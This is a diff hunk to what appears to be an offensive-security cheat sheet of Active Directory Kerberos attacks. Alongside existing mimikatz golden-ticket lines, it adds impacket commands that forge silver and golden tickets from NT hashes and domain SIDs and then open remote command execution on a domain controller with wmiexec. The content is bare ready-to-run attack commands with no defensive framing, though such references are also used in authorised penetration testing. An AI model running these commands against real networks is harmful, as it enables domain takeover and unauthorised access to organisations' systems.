@@ -362,6 +362,16 @@ kerberos::golden /user:utilisateur /domain:chocolate.local /sid:S-1-5-21-1304525
 kerberos::golden /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /aes256:15540cac73e94028231ef86631bc47bd5c827847ade468d6f6f739eb00c68e42 /user:Administrateur /id:500 /groups:513,512,520,518,519 /ptt /startoffset:-10 /endin:600 /renewmax:10080
 kerberos::golden /admin:Administrator /domain:CTU.DOMAIN /sid:S-1-1-12-123456789-1234567890-123456789 /krbtgt:deadbeefboobbabe003133700009999 /ticket:Administrator.kiribi
 
+[impacket: silver ticket]
+ticketer.py -spn HOST/dc01 -domain legitcorp.local -nthash ee44e9607cf6f1c6df69bf013a6fbb78 -dc-ip 192.168.86.170 -domain-sid S-1-5-21-1935943001-39345449-285568504 lolol
+export KRB5CCNAME=lolol.ccache
+wmiexec.py legitcorp.local/lolol@dc01 -dc-ip 192.168.86.170 -k -no-pass
+
+[impacket: golden ticket]
+ticketer.py -domain legitcorp.local -nthash 7e8612a348a729bcb2f597a9cbc27c12 -dc-ip 192.168.86.170 -domain-sid S-1-5-21-1935943001-39345449-285568504 lolol
+export KRB5CCNAME=lolol.ccache
+wmiexec.py legitcorp.local/lolol@dc01 -dc-ip 192.168.86.170 -k -no-pass
+
 [mimikatz: tgt]
 kerberos::tgt
 
